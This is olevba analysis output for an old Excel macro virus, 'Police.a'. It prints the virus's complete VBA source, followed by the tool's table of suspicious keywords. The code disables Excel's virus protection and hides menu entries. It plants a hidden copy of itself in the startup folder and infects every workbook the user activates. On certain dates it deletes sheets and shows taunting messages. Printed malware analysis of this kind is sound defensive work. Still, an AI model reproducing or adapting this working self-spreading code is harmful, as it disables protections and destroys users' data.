olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Police.a-57d24107f139b7c64ef2a4ae65bca162d3ff41d2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Police.bas 
in file: Virus.MSExcel.Police.a-57d24107f139b7c64ef2a4ae65bca162d3ff41d2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Police'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Options.VirusProtection = False
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("view").Controls("Toolbars").Delete
CommandBars("view").Controls("Status Bar").Delete
CommandBars("window").Controls("Unhide...").Delete
If spy() Then
    GoTo shotme:
Else
    fire
End If
shotme:
Application.OnSheetActivate = "FUCKPOL.XLM!action"
bye:
Call effect
End Sub

Function spy() As Boolean
Attribute spy.VB_ProcData.VB_Invoke_Func = " \n14"
spy = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "FUCKPOL.XLM" Then
    For y = 1 To Application.Workbooks("FUCKPOL.XLM").Modules.Count
        If Application.Workbooks("FUCKPOL.XLM").Modules(y).Name = "Police" Then
            spy = True
        End If
    Next y
    End If
Next x
End Function

Function fire()
Attribute fire.VB_ProcData.VB_Invoke_Func = " \n14"
  activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\FUCKPOL.XLM"
  Workbooks.Open (Application.StartupPath + "\FUCKPOL.XLM")
  Windows("FUCKPOL.XLM").Visible = False
 Application.Workbooks("FUCKPOL.XLM").Save
End Function

Function statusme() As Boolean
Attribute statusme.VB_ProcData.VB_Invoke_Func = " \n14"
activebook = ActiveWorkbook.Name
statusme = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "Police" Then
            statusme = True
   End If
Next y
End Function

Sub action()
Attribute action.VB_ProcData.VB_Invoke_Func = " \n14"
    oactivebook = ActiveWorkbook.Name
    If statusme() Then
    GoTo bye2
    Else
    End If
    Application.ScreenUpdating = False
    Application.Windows("FUCKPOL.XLM").Visible = True
    Workbooks("FUCKPOL.XLM").Activate
    Sheets("Police").Visible = True
    Workbooks("FUCKPOL.XLM").Sheets("Police").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("Police").Visible = False
    Workbooks("FUCKPOL.XLM").Sheets("Police").Visible = False
    Windows("FUCKPOL.XLM").Visible = False
bye2:
Close
End Sub

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo bye3
Application.DisplayAlerts = False
Application.Workbooks("FUCKPOL.XLM").Save
Application.ActiveWorkbook.Save
bye3:
End Sub

Sub effect()
Attribute effect.VB_ProcData.VB_Invoke_Func = " \n14"
If Application.UserName = "foxz" And Application.OrganizationName = "NoMercyVirusTeam" Then
GoTo boss
Else
End If
  If Day(Date) = "13" Or Day(Date) = "1" Or Day(Date) = "31" Then
  ActiveWindow.SelectedSheets.Delete
  Assistant.Visible = True
  With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "Six students of Universitas Trisakti, Jakarta, died from bullets fired by security personnel during an action of concern staged by thousands of students at the campus of Universitas Trisakti, Grogol, West Jakarta, on Tuesday (12/5). The six students were shot while on campus by a flurry of bullets, suspected to be fired by security troops on the Grogol fly-over. Dozens of other students suffered serious and minor injuries."
    .Heading = "XM97.Fucking Police"
    .Animation = msoAnimationEmptyTrash
    .Show
  End With
  Assistant.Visible = False
  Assistant.Visible = True
  With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "Until this report was prepared, around 200 students were still waiting in the corridors of the Sumber Waras Hospital, guarding their fellow-students still being treated in the Emergency Unit, as well as the remains of their colleagues laying in state. A moving atmosphere prevailed around the morgue, resounding with the shrieks and crying of the victims' relatives  (text by kompas online)"
    .Heading = "XM97.Fucking Police"
    .Animation = msoAnimationSearching
    .Show
  End With
  Assistant.Visible = False
  Assistant.Visible = True
  With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "Bwahahahaha, die you lamer!"
    .Heading = "I hate You !!"
    .Animation = msoAnimationEmptyTrash
    .Show
  End With
  Application.ActiveWorkbook.Save
  Application.ActiveWindow.Close
  Else
  End If
boss:
End Sub


-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Police.a-57d24107f139b7c64ef2a4ae65bca162d3ff41d2 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Police.a-57d24107f139b7c64ef2a4ae65bca162d3ff41d2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Police.a-57d24107f139b7c64ef2a4ae65bca162d3ff41d2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Polic
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

